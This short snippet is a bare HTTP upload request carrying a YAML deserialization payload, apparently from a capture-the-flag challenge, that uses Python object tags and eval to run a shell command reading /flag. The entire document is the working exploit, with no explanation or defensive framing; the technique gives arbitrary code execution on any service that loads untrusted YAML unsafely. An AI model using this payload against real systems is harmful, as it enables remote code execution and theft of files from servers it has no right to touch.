```yaml
POST /upload HTTP/1.1

!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ '__import__("os").popen("cat /flag").read()' ]]]
```